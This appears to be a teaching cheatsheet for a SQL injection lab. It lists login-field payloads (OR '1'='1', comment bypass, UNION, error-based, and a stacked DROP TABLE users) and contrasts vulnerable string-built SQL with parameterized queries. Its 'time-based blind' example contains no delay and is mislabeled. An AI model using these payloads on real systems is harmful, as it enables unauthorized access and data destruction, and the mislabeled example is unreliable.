# 💉 SQL Injection Attack Cheatsheet

Quick reference for testing SQL injection vulnerabilities in the lab.

---

## 🎯 Basic Attacks

### 1. Comment-Based Bypass
```
Email: admin@example.com' --
Password: anything
```
**How it works:** `--` comments out the password check

---

### 2. Always True (OR Injection)
```
Email: ' OR '1'='1
Password: ' OR '1'='1
```
**How it works:** Makes the WHERE clause always true

---

### 3. Email-Only Bypass
```
Email: admin@example.com' OR '1'='1' --
Password: ignored
```
**How it works:** Combines OR injection with comment

---

### 4. Single Quote Test
```
Email: admin@example.com'
Password: test
```
**How it works:** Tests if input is properly escaped (should cause SQL error)

---

## 🔍 Information Gathering

### 5. Error-Based Injection
```
Email: admin@example.com' AND 1=CONVERT(int, (SELECT @@version)) --
Password: anything
```
**How it works:** Forces SQL error that reveals database info

---

### 6. Boolean-Based Blind
```
Email: admin@example.com' AND 1=1 --
Password: anything
```
**How it works:** Tests true condition (should work if vulnerable)

```
Email: admin@example.com' AND 1=2 --
Password: anything
```
**How it works:** Tests false condition (should fail)

---

## 🚀 Advanced Attacks

### 7. UNION-Based Injection
```
Email: ' UNION SELECT 1,2,3,4 --
Password: anything
```
**How it works:** Combines results from multiple queries

---

### 8. Time-Based Blind
```
Email: admin@example.com' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END) --
Password: anything
```
**How it works:** Uses conditional logic to extract data

---

### 9. Stacked Queries (if supported)
```
Email: admin@example.com'; DROP TABLE users; --
Password: anything
```
**How it works:** Executes multiple SQL statements (DANGEROUS!)

---

## 🛡️ Testing Secure Implementation

Try all the above attacks in **Secure Mode** - they should all fail!

### Expected Behavior:
- ✅ Normal login works
- ❌ All injection attempts fail
- ❌ No SQL errors exposed
- ❌ Special characters treated as literal data

---

## 🔬 What to Observe

When testing, watch for:

1. **Query Structure** - How does your input modify the SQL?
2. **Error Messages** - Do they reveal database structure?
3. **Response Differences** - Can you detect true/false conditions?
4. **Execution Time** - Does the query take longer (time-based attacks)?

---

## 📊 Attack Success Indicators

| Indicator | Meaning |
|-----------|---------|
| Login successful with wrong password | ✅ Vulnerable |
| SQL error message visible | ✅ Vulnerable |
| Different responses for true/false | ✅ Vulnerable |
| Query structure changes | ✅ Vulnerable |
| All attacks fail in secure mode | ✅ Properly secured |

---

## 🎓 Learning Exercise

For each attack:
1. Try it in **Vulnerable Mode**
2. Observe the actual SQL query executed
3. Understand WHY it worked
4. Try the same in **Secure Mode**
5. See how parameterized queries prevent it

---

## 🔑 Key Patterns to Remember

### Vulnerable Pattern:
```typescript
const query = `SELECT * FROM users WHERE email = '${email}'`;
```

### Secure Pattern:
```typescript
const query = `SELECT * FROM users WHERE email = ?`;
db.prepare(query).get(email);
```

---

## ⚠️ Real-World Impact

These attacks can lead to:
- 🔓 Unauthorized access
- 📊 Data theft
- 💣 Data destruction
- 🎭 Privilege escalation
- 🔐 Complete system compromise

**That's why proper input handling is critical!**

---

## 🎯 Practice Goals

- [ ] Successfully bypass login in vulnerable mode
- [ ] Understand each attack technique
- [ ] Verify all attacks fail in secure mode
- [ ] Explain why parameterized queries work
- [ ] Identify vulnerable code patterns

---

Happy hacking (ethically)! 🚀
